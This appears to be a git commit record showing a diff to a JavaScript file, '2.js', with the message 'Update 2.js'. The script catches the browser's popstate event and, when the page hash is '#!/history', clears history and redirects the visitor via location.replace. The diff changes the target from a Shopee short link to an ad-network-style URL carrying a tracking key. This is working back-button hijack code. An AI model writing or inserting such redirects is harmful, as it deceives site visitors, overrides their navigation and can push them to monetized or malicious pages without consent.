99bc8687b260cf8b153e74f0f3b9ebdf4b091410
mychiara <85479169+mychiara@users.noreply.github.com>
2022-08-12 20:12:42 +0800

    Update 2.js

--- 2.js
+++ 2.js
@@ -7,7 +7,7 @@ window.addEventListener("popstate", function() {
 if(location.hash === "#!/history") {
 history.replaceState(null, document.title, location.pathname);
 setTimeout(function(){
-location.replace("https://shope.ee/6Uhmz5pJ0c");
+location.replace("https://www.highperformancegate.com/d7ha27e5?key=3e13d68a557a37d91e09eff64ec81731");
 },10);
 }
 }, false);
